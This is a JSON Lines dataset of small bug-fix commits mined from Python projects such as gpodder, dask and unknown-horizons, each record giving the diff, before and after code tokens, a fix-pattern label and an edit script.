{"project": "gpodder", "commit_sha": "55df27f3f33615262cb384aa208ac8f9cfb91a4a", "parent_sha": "9c8fd358c33dc4c1180c786907469a54691448b4", "file_path": "src/gpodder/gtkui/frmntl/about.py", "project_url": "https://github.com/christofdamian/gpodder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class HeAboutDialog(gtk.Dialog):\n         self.set_title(_('About'))\n \n         self.image_icon = gtk.Image()\n-        self.label_app_name = gtk.Label(app_name)\n+        self.label_app_name = gtk.Label()\n         self.label_version = gtk.Label()\n         self.label_description = gtk.Label()\n         self.label_copyright = gtk.Label()\n", "before": "self . label_app_name = gtk . Label ( app_name )", "after": "self . label_app_name = gtk . Label ( )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:app_name\", 3, 41, 3, 49]]]"}
{"project": "landscape-service", "commit_sha": "8c4d8f4b9cc574a7410b8324c5f7b83381634aad", "parent_sha": "371d9c2206f0465b2d3fc0ccf8fc4a8618bf7826", "file_path": "main.py", "project_url": "https://github.com/mellowDice/landscape-service", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -33,7 +33,7 @@ def test_connect():\n def get_landscape():\n     seed = datetime.datetime.now()\n     seed = seed.hour + 24 * (seed.day + 31 * seed.month) * 4352 + 32454354\n-    print('get landscape', terrain)\n+    print('get landscape')\n     # terrain = build_landscape(250, 250, seed=seed, octaves=1).tolist()\n     terrain = np.zeros((250, 250)).tolist()\n     requests.post(microservices_urls['field_objects']+'/store_terrain', json = {'terrain':terrain})\n", "before": "print ( 'get landscape' , terrain )", "after": "print ( 'get landscape' )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 26, 3, 27]], [\"Delete\", [\"identifier:terrain\", 3, 28, 3, 35]]]"}
{"project": "pycortex", "commit_sha": "fb856275e9254626959406797a86a32423b4fd9b", "parent_sha": "da4e86fb91917b011381927e5370e73c182c47fc", "file_path": "cortex/utils.py", "project_url": "https://github.com/InstitutoDOr/pycortex", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ def add_roi(data, subject, xfmname, name=\"new_roi\", recache=False, open_inkscape\n     from .utils import get_roipack\n     from . import quickflat\n     rois = get_roipack(subject)\n-    im = quickflat.make(data, subject, xfmname, height=1024, recache=recache, projection=projection, with_rois=False)\n+    im = quickflat.make(data, subject, xfmname, height=1024, recache=recache, projection=projection)\n     try:\n         import cStringIO\n         fp = cStringIO.StringIO()\n", "before": "im = quickflat . make ( data , subject , xfmname , height = 1024 , recache = recache , projection = projection , with_rois = False )", "after": "im = quickflat . make ( data , subject , xfmname , height = 1024 , recache = recache , projection = projection )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 100, 3, 101]], [\"Delete\", [\"identifier:with_rois\", 3, 102, 3, 111]], [\"Delete\", [\"=:=\", 3, 111, 3, 112]], [\"Delete\", [\"false:False\", 3, 112, 3, 117]], [\"Delete\", [\"keyword_argument\", 3, 102, 3, 117]]]"}
{"project": "TTRanger", "commit_sha": "6151e78a236f4bb7972b0fd3aa2870776b24c11c", "parent_sha": "4446cdea58dc550deebde7e9e3a82f3f9436a53b", "file_path": "toontown/suit/SuitLegList.py", "project_url": "https://github.com/colenoreika/TTRanger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,7 +161,7 @@ class SuitLegList:\n \n     def getLegIndexAtTime(self, time, startLeg):\n         endTime = 0.0\n-        for legIndex in xrange(startLeg, self.getNumLegs()):\n+        for legIndex in xrange(self.getNumLegs()):\n             endTime += self.getLegTime(legIndex)\n             if endTime > time:\n                 break\n", "before": "for legIndex in xrange ( startLeg , self . getNumLegs ( ) ) : endTime += self . getLegTime ( legIndex ) if endTime > time : break", "after": "for legIndex in xrange ( self . getNumLegs ( ) ) : endTime += self . getLegTime ( legIndex ) if endTime > time : break", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:startLeg\", 3, 32, 3, 40]], [\"Delete\", [\",:,\", 3, 40, 3, 41]]]"}
{"project": "TTRanger", "commit_sha": "3dca16f30cce5809cfaa782184bb1a4e8c676414", "parent_sha": "614b3353859b4939052050b6c42ce4ddc71edc14", "file_path": "toontown/coghq/DistributedCogHQDoor.py", "project_url": "https://github.com/colenoreika/TTRanger", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ class DistributedCogHQDoor(DistributedDoor.DistributedDoor):\n             self.doorX = 1.0\n \n     def enterDoor(self):\n-        if self.allowedToEnter(self.zoneId):\n+        if self.allowedToEnter():\n             messenger.send('DistributedDoor_doorTrigger')\n             self.sendUpdate('requestEnter')\n         else:\n", "before": "if self . allowedToEnter ( self . zoneId ) : messenger . send ( 'DistributedDoor_doorTrigger' ) self . sendUpdate ( 'requestEnter' ) else : ", "after": "if self . allowedToEnter ( ) : messenger . send ( 'DistributedDoor_doorTrigger' ) self . sendUpdate ( 'requestEnter' ) else : ", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"identifier:self\", 3, 32, 3, 36]], [\"Delete\", [\".:.\", 3, 36, 3, 37]], [\"Delete\", [\"identifier:zoneId\", 3, 37, 3, 43]], [\"Delete\", [\"attribute\", 3, 32, 3, 43]]]"}
{"project": "SimpleCV", "commit_sha": "a9d7c10358676d3ea0adb9b3df9e936aad5de409", "parent_sha": "6840085b30af44cbf49b4fc7affcc77b8c040173", "file_path": "SimpleCV/ImageClass.py", "project_url": "https://github.com/CVandML/SimpleCV", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -12894,7 +12894,7 @@ class Image:\n             tkp = tfs[i]\n             pt_a = (int(tkp.y), int(tkp.x)+hdif)\n             pt_b = (int(skp.y)+template.width, int(skp.x))\n-            resultImg.drawLine(pt_a, pt_b, color=Color.getRandom(Color()),thickness=width)\n+            resultImg.drawLine(pt_a, pt_b, color=Color.getRandom(),thickness=width)\n         return resultImg\n \n     def stegaEncode(self,message):\n", "before": "resultImg . drawLine ( pt_a , pt_b , color = Color . getRandom ( Color ( ) ) , thickness = width )", "after": "resultImg . drawLine ( pt_a , pt_b , color = Color . getRandom ( ) , thickness = width )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\"(:(\", 3, 65, 3, 66]], [\"Delete\", [\"):)\", 3, 73, 3, 74]]]"}
{"project": "tox", "commit_sha": "656b7532354de22fda6cbbc66eb570607b3bf369", "parent_sha": "a8d52a055ef7cfbfc4180ce26c1a7f1ba7c9eabb", "file_path": "toxbootstrap.py", "project_url": "https://github.com/nicoddemus/tox", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -124,7 +124,7 @@ def has_script(venv, name):\n def activate_path(venv):\n     \"\"\"Return the full path to the script virtualenv directory\"\"\"\n     if sys.platform == 'win32':\n-        p = path.abspath(path.join(venv, 'Scripts', name))\n+        p = path.abspath(path.join(venv, 'Scripts'))\n     else:\n         p = path.abspath(path.join(venv, 'bin'))\n     assert path.exists(p), p\n", "before": "p = path . abspath ( path . join ( venv , 'Scripts' , name ) )", "after": "p = path . abspath ( path . join ( venv , 'Scripts' ) )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 51, 3, 52]], [\"Delete\", [\"identifier:name\", 3, 53, 3, 57]]]"}
{"project": "InvenioAuthorLists", "commit_sha": "1e74a99408ee4d85a0a62ec3d5534f10fde0d085", "parent_sha": "2501c04e7b0cd386b8f4157a9d4d2dc4f2656d65", "file_path": "modules/bibupload/lib/bibupload.py", "project_url": "https://github.com/jmartinm/InvenioAuthorLists", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1020,7 +1020,7 @@ def elaborate_fft_tags(record, rec_id, mode):\n                         elif doctype == 'EXPUNGE':\n                             bibdoc.expunge()\n                         elif doctype == 'FIX':\n-                            bibrecdocs.fix(docname, True)\n+                            bibrecdocs.fix(docname)\n                         elif doctype == 'REVERT':\n                             try:\n                                 bibdoc.revert(version)\n", "before": "elif doctype == 'FIX' : bibrecdocs . fix ( docname , True )", "after": "elif doctype == 'FIX' : bibrecdocs . fix ( docname )", "sstub_pattern": "SAME_FUNCTION_LESS_ARGS", "edit_script": "[[\"Delete\", [\",:,\", 3, 51, 3, 52]], [\"Delete\", [\"true:True\", 3, 53, 3, 57]]]"}
{"project": "toppra", "commit_sha": "e2e6bde1af72878c513150217517e9429f3516b5", "parent_sha": "214942d122d85dd33107f0d7a96332bd89f2a831", "file_path": "toppra/simplepath.py", "project_url": "https://github.com/hungpham2511/toppra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -44,7 +44,7 @@ class SimplePath(AbstractGeometricPath):\n     def __call__(self, xi, order=0):\n         \"\"\"Evaluate the path at given position.\"\"\"\n         ret = [poly.derivative(order)(xi) for poly in self._polys]\n-        return np.array(ret)\n+        return np.array(ret).T\n \n     @property\n     def dof(self):\n", "before": "return np . array ( ret )", "after": "return np . array ( ret ) . T", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 29], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 16, 3, 29], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:T\", \"T\"], 2]]"}
{"project": "OoT-Randomizer", "commit_sha": "c3f0f359cebbff5432f72ee055139ad2e706916a", "parent_sha": "220052c8d7f94d9197ca886ddcfa3d1814953a74", "file_path": "Main.py", "project_url": "https://github.com/TestRunnerSRL/OoT-Randomizer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -443,7 +443,7 @@ def cosmetic_patch(settings, window=dummy_window()):\n     window.update_status('Creating Patch File')\n \n     # base the new patch file on the base patch file\n-    rom.original = patched_base_rom\n+    rom.original.buffer = patched_base_rom\n \n     rom.update_crc()\n     create_patch_file(rom, patchfilename)\n", "before": "rom . original = patched_base_rom", "after": "rom . original . buffer = patched_base_rom", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 5, 3, 17], [\"attribute\", 3, 5, 3, 17], 0], [\"Insert\", [\"attribute\", 3, 5, 3, 17], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 5, 3, 17], [\"identifier:buffer\", \"T\"], 2]]"}
{"project": "django-referral", "commit_sha": "0baff4982008934363d4a1e03672e833689511eb", "parent_sha": "d05280f786a0352f4d4852626ca673592b89d769", "file_path": "referral/tests/models_tests.py", "project_url": "https://github.com/byteweaver/django-referral", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class UserReferrerTestCase(TestCase):\n         referrer = ReferrerFactory()\n         user = UserFactory()\n         request = HttpRequest()\n-        request.session = {settings.SESSION_KEY: referrer}\n+        request.session = {settings.SESSION_KEY: referrer.pk}\n         UserReferrer.objects.apply_referrer(user, request)\n         self.assertEqual(user.user_referrer.referrer, referrer)\n \n", "before": "request . session = { settings . SESSION_KEY : referrer }", "after": "request . session = { settings . SESSION_KEY : referrer . pk }", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"pair\", 3, 28, 3, 58], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:referrer\", 3, 50, 3, 58], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:pk\", \"T\"], 2]]"}
{"project": "radical.saga", "commit_sha": "d0e73ad1330e9d18188d7f06b95d5e7275b57ffe", "parent_sha": "1d67f166b54e0d8df1f0f4e76ec25d677ab6b18c", "file_path": "saga/adaptors/shell/shell_job.py", "project_url": "https://github.com/radical-cybertools/radical.saga", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -303,7 +303,7 @@ class ShellJobService (saga.adaptors.cpi.job.Service) :\n         self.njobs   = 0\n \n \n-        self.shell = saga.utils.pty_shell.PTYShell (self.rm, self.contexts, \n+        self.shell = saga.utils.pty_shell.PTYShell (self.rm, self.session.contexts, \n                                                     self._logger)\n \n         self.shell.set_initialize_hook (self.initialize)\n", "before": "self . shell = saga . utils . pty_shell . PTYShell ( self . rm , self . contexts , self . _logger )", "after": "self . shell = saga . utils . pty_shell . PTYShell ( self . rm , self . session . contexts , self . _logger )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 62, 3, 75], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 62, 3, 75], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 62, 3, 66], 0], [\"Move\", \"N0\", [\".:.\", 3, 66, 3, 67], 1], [\"Insert\", \"N0\", [\"identifier:session\", \"T\"], 2]]"}
{"project": "blaze", "commit_sha": "c82ef950560f0c98e4853074a0b740899e3bfb98", "parent_sha": "b5d87b44ca865f2f9f7e7a2a7efad2b41cb22c77", "file_path": "blaze/datashape/tests/test_datashape_creation.py", "project_url": "https://github.com/TomAugspurger/blaze", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,7 +10,7 @@ class TestDatashapeCreation(unittest.TestCase):\n         self.assertRaises(TypeError, blaze.dshape, None)\n         self.assertRaises(TypeError, blaze.dshape, lambda x: x+1)\n         # Check issue 11\n-        self.assertRaises(datashape.DatashapeSyntaxError, blaze.dshape, '1,')\n+        self.assertRaises(datashape.parser.DatashapeSyntaxError, blaze.dshape, '1,')\n \n     def test_atom_shapes(self):\n         self.assertEqual(blaze.dshape('bool'), datashape.bool_)\n", "before": "self . assertRaises ( datashape . DatashapeSyntaxError , blaze . dshape , '1,' )", "after": "self . assertRaises ( datashape . parser . DatashapeSyntaxError , blaze . dshape , '1,' )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 27, 3, 57], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 27, 3, 57], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:datashape\", 3, 27, 3, 36], 0], [\"Move\", \"N0\", [\".:.\", 3, 36, 3, 37], 1], [\"Insert\", \"N0\", [\"identifier:parser\", \"T\"], 2]]"}
{"project": "dask", "commit_sha": "fc1051e002b3016b803993893f5b629d461047aa", "parent_sha": "66afcad5c5d93ef8ad2835372671a8cf55e64201", "file_path": "dask/bytes/core.py", "project_url": "https://github.com/TomAugspurger/dask", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -494,7 +494,7 @@ def ensure_protocol(protocol):\n         msg = (\"Need to install `hdfs3 > 0.2.0` for HDFS support\\n\"\n                \"    conda install hdfs3 -c conda-forge\")\n         hdfs3 = import_required('hdfs3', msg)\n-        if not LooseVersion(hdfs3) > '0.2.0':\n+        if not LooseVersion(hdfs3.__version__) > '0.2.0':\n             raise RuntimeError(msg)\n         import hdfs3.dask  # register dask filesystem\n \n", "before": "if not LooseVersion ( hdfs3 ) > '0.2.0' : raise RuntimeError ( msg )", "after": "if not LooseVersion ( hdfs3 . __version__ ) > '0.2.0' : raise RuntimeError ( msg )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 35], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:hdfs3\", 3, 29, 3, 34], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:__version__\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "6a4e4f8aa7abb0b0f1bcb85b0671f67877cc6fb4", "parent_sha": "04d0037819d14965c3cd92afc88f22c021d9d170", "file_path": "horizons/gui/ingamegui.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -451,7 +451,7 @@ class IngameGui(LivingObject):\n \t\t\tself.widgets['ingame_pause'].mapEvents({'unpause_button': self.toggle_ingame_pause})\n \t\t\tself.widgets['ingame_pause'].show()\n \t\telse:\n-\t\t\tself.main_gui.on_escape = self.show_pause\n+\t\t\tself.main_gui.on_escape = self.main_gui.show_pause\n \t\t\tself.widgets['ingame_pause'].hide()\n \t\t\tself.session.speed_unpause()\n \n", "before": "else : self . main_gui . on_escape = self . show_pause", "after": "else : self . main_gui . on_escape = self . main_gui . show_pause", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 30, 3, 45], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 30, 3, 45], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 30, 3, 34], 0], [\"Move\", \"N0\", [\".:.\", 3, 34, 3, 35], 1], [\"Insert\", \"N0\", [\"identifier:main_gui\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "a2eb53b3eb592511be18ef76edcb7d6009e1c53f", "parent_sha": "ddbbeca0b30d2bbfcac80163d96d8ca0c98fe55b", "file_path": "horizons/world/units/groundunit.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class GroundUnit(Unit):\n \t\t\tself.deselect()\n \t\t\tself.session.selected_instances.remove(self)\n \t\tsuper(GroundUnit, self).remove()\n-\t\tself.session.ground_units.remove(self)\n+\t\tself.session.world.ground_units.remove(self)\n \t\tif self.session.view.has_change_listener(self.draw_health):\n \t\t\tself.session.view.remove_change_listener(self.draw_health)\n \t\tdel self.session.world.ground_unit_map[self.position.to_tuple()]\n", "before": "self . session . ground_units . remove ( self )", "after": "self . session . world . ground_units . remove ( self )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 3, 3, 15], [\"attribute\", 3, 3, 3, 15], 0], [\"Insert\", [\"attribute\", 3, 3, 3, 15], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 3, 3, 15], [\"identifier:world\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "4a253f69ab9461c2f071167706dc268d50781727", "parent_sha": "23e81da5c4ff6ec1b05c7dc703116fcb8fc6a1ae", "file_path": "horizons/world/production/producer.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -305,7 +305,7 @@ class QueueProducer(Producer):\n \t\t\tself.set_active(active=True)\n \t\t\tself._productions.clear() # Make sure we only have one production active\n \t\t\tproduction_line_id = self.production_queue.pop(0)\n-\t\t\towner_inventory = self._get_owner_inventory()\n+\t\t\towner_inventory = self.instance._get_owner_inventory()\n \t\t\tprod = self.production_class(inventory=self.get_component(StorageComponent).inventory, owner_inventory=owner_inventory, prod_line_id=production_line_id)\n \t\t\tprod.add_production_finished_listener(self.on_queue_element_finished)\n \t\t\tself.add_production( prod )\n", "before": "owner_inventory = self . _get_owner_inventory ( )", "after": "owner_inventory = self . instance . _get_owner_inventory ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 22, 3, 47], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 22, 3, 47], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 22, 3, 26], 0], [\"Move\", \"N0\", [\".:.\", 3, 26, 3, 27], 1], [\"Insert\", \"N0\", [\"identifier:instance\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "4ed924305bdffee3888fd902aff7e06d34e7163e", "parent_sha": "750a7b8ac0ccd015b30e8e90ca40b66cf31765a3", "file_path": "horizons/world/__init__.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -355,7 +355,7 @@ class World(BuildingOwner, WorldObject):\n \t\tmoves = [(-1, -1), (-1, 0), (-1, 1), (0, -1), (0, 1), (1, -1), (1, 0), (1, 1)]\n \n \t\tn = 0\n-\t\tself.water_body = dict(self.water)\n+\t\tself.water_body = dict.fromkeys(self.water)\n \t\tfor coords, num in self.water_body.iteritems():\n \t\t\tif num is not None:\n \t\t\t\tcontinue\n", "before": "self . water_body = dict ( self . water )", "after": "self . water_body = dict . fromkeys ( self . water )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 21, 3, 37], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:dict\", 3, 21, 3, 25], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:fromkeys\", \"T\"], 2]]"}
{"project": "unknown-horizons", "commit_sha": "7f277eec7d49b4e2b928932f92e919651f5f702b", "parent_sha": "ba315c3a818bf36b2894a718eace964c3eeb23e0", "file_path": "horizons/gui/modules/select_savegame.py", "project_url": "https://github.com/schittom/unknown-horizons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -133,7 +133,7 @@ class SelectSavegameDialog(object):\n \n \t\tretval = self.mainmenu.show_dialog(self.current, bind)\n \t\tif not retval: # cancelled\n-\t\t\tself.current = old_current\n+\t\t\tself.mainmenu.current = old_current # return back to old state\n \t\t\treturn\n \n \t\tif retval == 'delete':\n", "before": "self . current = old_current", "after": "self . mainmenu . current = old_current", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 4, 3, 16], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 4, 3, 16], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 4, 3, 8], 0], [\"Move\", \"N0\", [\".:.\", 3, 8, 3, 9], 1], [\"Insert\", \"N0\", [\"identifier:mainmenu\", \"T\"], 2]]"}
{"project": "descqa", "commit_sha": "9fb8236eb405621a0e944c07576cc76d2ae55aaf", "parent_sha": "50824a715419d4dbbe258dfd1b97d57a11738126", "file_path": "descqa/apparent_mag_func_test.py", "project_url": "https://github.com/vvinuv/descqa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -226,7 +226,7 @@ class ApparentMagFuncTest(BaseValidationTest):\n         lower_ax.plot(m, m*0.0, '-', color='black')\n         lower_ax.plot(mag_bins, delta, '-')\n \n-        self.summary_lower_ax(mag_bins, delta, '-', label=catalog_name)\n+        self.summary_lower_ax.plot(mag_bins, delta, '-', label=catalog_name)\n \n         # apply 'passing' criterion\n         if max_frac_diff>self.fractional_tol:\n", "before": "self . summary_lower_ax ( mag_bins , delta , '-' , label = catalog_name )", "after": "self . summary_lower_ax . plot ( mag_bins , delta , '-' , label = catalog_name )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 9, 3, 30], [\"attribute\", 3, 9, 3, 30], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 30], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 9, 3, 30], [\"identifier:plot\", \"T\"], 2]]"}
{"project": "urbanradder", "commit_sha": "fdf10a70f896073ee435cee843c1d5c333f130a6", "parent_sha": "bb920bbaa893f0747551bc2f25197f17a96b3ff6", "file_path": "saleor/checkout/steps.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ class BillingAddressStep(BaseAddressStep):\n         skip = False\n         if not address and request.user.is_authenticated():\n             if request.user.default_billing_address:\n-                address = request.user.default_billing_address\n+                address = request.user.default_billing_address.address\n                 skip = True\n             elif request.user.address_book.count() == 1:\n                 address = request.user.address_book.all()[0].address\n", "before": "address = request . user . default_billing_address", "after": "address = request . user . default_billing_address . address", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 27, 3, 63], [\"attribute\", 3, 27, 3, 63], 0], [\"Insert\", [\"attribute\", 3, 27, 3, 63], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 27, 3, 63], [\"identifier:address\", \"T\"], 2]]"}
{"project": "urbanradder", "commit_sha": "3b822da55e05c65fe07785dfd2fe2ec4452edc39", "parent_sha": "45ace8f3d24b43d569be15ee6a61db74d3caaccd", "file_path": "saleor/order/views.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -82,7 +82,7 @@ def start_payment(request, order, variant):\n                 'billing_address_2': billing.street_address_2,\n                 'billing_city': billing.city,\n                 'billing_postcode': billing.postal_code,\n-                'billing_country_code': billing.country,\n+                'billing_country_code': billing.country.code,\n                 'billing_email': order.user_email,\n                 'description': pgettext_lazy(\n                     'Payment description', 'Order %(order_number)s') % {\n", "before": "'billing_country_code' : billing . country ,", "after": "'billing_country_code' : billing . country . code ,", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 17, 3, 56], [\"attribute\", 3, 17, 3, 56], 0], [\"Insert\", [\"attribute\", 3, 17, 3, 56], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 17, 3, 56], [\"identifier:code\", \"T\"], 2]]"}
{"project": "urbanradder", "commit_sha": "fbbf801249e172c6d1d1d33b1b1565c9b5f99ffb", "parent_sha": "ec5502c44717cc77182273348913b3b982fa25a1", "file_path": "saleor/checkout/views/summary.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def create_order(checkout):\n     order.history.create(\n         user=user, content=pgettext_lazy(\n             'Order status history entry', 'Order was placed'))\n-    send_order_confirmation.delay(order)\n+    send_order_confirmation.delay(order.pk)\n     return order, redirect('order:payment', token=order.token)\n \n \n", "before": "send_order_confirmation . delay ( order )", "after": "send_order_confirmation . delay ( order . pk )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 34, 3, 41], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:order\", 3, 35, 3, 40], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:pk\", \"T\"], 2]]"}
{"project": "urbanradder", "commit_sha": "b1ed26bb402d7042463c69df5dbc0228c02ebc15", "parent_sha": "69e35b272d505304bd3256a92d621b028aa1eaec", "file_path": "saleor/graphql/payment/mutations.py", "project_url": "https://github.com/johnchendev/urbanradder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ class CheckoutPaymentCreate(BaseMutation, I18nMixin):\n             'billing_address_2': billing_address.street_address_2,\n             'billing_city': billing_address.city,\n             'billing_postal_code': billing_address.postal_code,\n-            'billing_country_code': billing_address.country,\n+            'billing_country_code': billing_address.country.code,\n             'billing_country_area': billing_address.country_area}\n         return billing_data\n \n", "before": "'billing_country_code' : billing_address . country ,", "after": "'billing_country_code' : billing_address . country . code ,", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 13, 3, 60], [\"attribute\", 3, 13, 3, 60], 0], [\"Insert\", [\"attribute\", 3, 13, 3, 60], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 13, 3, 60], [\"identifier:code\", \"T\"], 2]]"}
{"project": "autotest-", "commit_sha": "6bc5288e7d071e98cc1bdbfda1955928d7f81385", "parent_sha": "ce75c4de501edd60e9c24aaf6aec1e4714f72d21", "file_path": "client/common_lib/error.py", "project_url": "https://github.com/bobby0809/autotest-", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class CmdError(TestError):\n \n \tdef __str__(self):\n \t\tmsg = \"Command <%s> failed, rc=%d\" % (self.args[0],\n-\t\t\t\t\t\t      self.args[1])\n+\t\t\t\t\t\t      self.args[1].exit_status)\n \t\tif self.args[2]:\n \t\t\tmsg += \", \" + self.args[2]\n \t\treturn msg\n", "before": "msg = \"Command <%s> failed, rc=%d\" % ( self . args [ 0 ] , self . args [ 1 ] )", "after": "msg = \"Command <%s> failed, rc=%d\" % ( self . args [ 0 ] , self . args [ 1 ] . exit_status )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"tuple\", 2, 40, 3, 26], [\"attribute\", \"N0\"], 3], [\"Move\", \"N0\", [\"subscript\", 3, 13, 3, 25], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:exit_status\", \"T\"], 2]]"}
